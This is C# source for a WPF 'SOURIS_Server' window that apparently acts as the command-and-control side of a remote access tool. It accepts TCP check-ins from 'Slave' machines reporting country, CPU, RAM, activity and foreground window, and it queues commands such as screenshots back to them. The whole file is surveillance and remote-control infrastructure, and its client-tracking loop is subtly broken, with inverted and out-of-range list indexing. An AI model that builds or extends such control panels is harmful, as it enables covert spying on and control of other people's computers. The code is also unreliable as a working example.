using MahApps.Metro.Controls;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace SOURIS_Server
{
    public class Slave
    {
        public string Name { get; set; }
        public string Country { get; set; }
        public string Ping { get; set; }
        public string CPU { get; set; }
        public string RAM { get; set; }
        public string Activity { get; set; }
        public string Front { get; set; }
        public string Nextinteract { get; set; }
    }
    /// <summary>
    /// Logique d'interaction pour MainWindow.xaml
    /// </summary>
    public class StateObject
    {
        // Client  socket.
        public Socket workSocket = null;
        // Size of receive buffer.
        public const int BufferSize = 1024;
        // Receive buffer.
        public byte[] buffer = new byte[BufferSize];
        // Received data string.
        public StringBuilder sb = new StringBuilder();
    }

    public class AsynchronousSocketListener
    {
    }
    public partial class MainWindow : MetroWindow
    {
        public List<Slave> Slavelist = new List<Slave>();
        // Thread signal.
        public static ManualResetEvent allDone = new ManualResetEvent(false);
        public void StartListening()
        {
            byte[] bytes = new Byte[1024];
            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 11000);
            Socket listener = new Socket(AddressFamily.InterNetwork,
                SocketType.Stream, ProtocolType.Tcp);
            try
            {
                listener.Bind(localEndPoint);
                listener.Listen(100);
                while (true)
                {
                    allDone.Reset();
                    addlistbox("Waiting for a connection...");
                    listener.BeginAccept(
                        new AsyncCallback(AcceptCallback),
                        listener);
                    allDone.WaitOne();
                }

            }
            catch (Exception e)
            {
                addlistbox(e.ToString());
            }

            Console.Read();

        }

        public void AcceptCallback(IAsyncResult ar)
        {
            allDone.Set();
            Socket listener = (Socket)ar.AsyncState;
            Socket handler = listener.EndAccept(ar);
            StateObject state = new StateObject();
            state.workSocket = handler;
            handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                new AsyncCallback(ReadCallback), state);
        }

        public void ReadCallback(IAsyncResult ar)
        {
            String content = String.Empty;
            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;
            int bytesRead = handler.EndReceive(ar);

            if (bytesRead > 0)
            {
                state.sb.Append(Encoding.ASCII.GetString(
                    state.buffer, 0, bytesRead));
                content = state.sb.ToString();
                addlistbox($"Read {content.Length} bytes from socket. \nData : {content}");
                int count = 0;
                if (content.Contains("|"))
                {
                    string[] SlaveContent = content.Split('|');
                    while (Slavelist.Count <= count)
                    {
                        try
                        {
                            if (Slavelist[count].Name.Contains(SlaveContent[0]))
                            {
                                Slavelist[count].Name = SlaveContent[0];
                                Slavelist[count].Country = SlaveContent[1];
                                Slavelist[count].Ping = SlaveContent[2];
                                Slavelist[count].CPU = SlaveContent[3];
                                Slavelist[count].RAM = SlaveContent[4];
                                Slavelist[count].Activity = SlaveContent[5];
                                Slavelist[count].Front = SlaveContent[6];
                                Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
                                break;
                            }
                            count++;

                        }
                        catch (Exception)
                        {
                            break;
                        }
                    }
                    if (Slavelist.Count >= count)
                    {
                        Slavelist.Add(new Slave { Name = SlaveContent[0], Country = SlaveContent[1], Ping = SlaveContent[2], CPU = SlaveContent[3], RAM = SlaveContent[4], Activity = SlaveContent[5], Front = SlaveContent[6] });
                        Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
                    }
                }
                string msgback = "Ok";
                if (!String.IsNullOrEmpty(Slavelist[count].Nextinteract))
                {
                    msgback = Slavelist[count].Nextinteract;
                    Slavelist[count].Nextinteract = "";
                }
                Send(handler, msgback);
            }
        }

        private void Send(Socket handler, String data)
        {
            byte[] byteData = Encoding.ASCII.GetBytes(data);
            handler.BeginSend(byteData, 0, byteData.Length, 0,
                new AsyncCallback(SendCallback), handler);
        }

        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket handler = (Socket)ar.AsyncState;
                int bytesSent = handler.EndSend(ar);
                addlistbox($"Sent {bytesSent} bytes to client.");
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();

            }
            catch (Exception e)
            {
                addlistbox(e.ToString());
            }
        }
        public void addlistbox(string message)
        {
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listBox.Items.Add(message)));
        }

        public MainWindow()
        {
            InitializeComponent();
            var Listenstart = Task.Factory.StartNew(() => { StartListening(); });
            var start = Task.Factory.StartNew(() => { startingtask(); });
        }
        public void startingtask()
        {
            addlistbox(" >> Server Started");
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.ItemsSource = Slavelist));
            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
        }
        private void MenuItemDelete_Click(object sender, RoutedEventArgs e)
        {
            int intselectedindex = listView1.SelectedIndex;
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    int selected = listView1.SelectedIndex;
                    Slavelist.RemoveAt(selected);
                    listView1.Items.Refresh();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        private void Screenshot(object sender, RoutedEventArgs e)
        {
            try
            {
                int selected = listView1.SelectedIndex;
                Slavelist[selected].Nextinteract = "screenshot";
            }
            catch
            {

            }
        }
    }
}
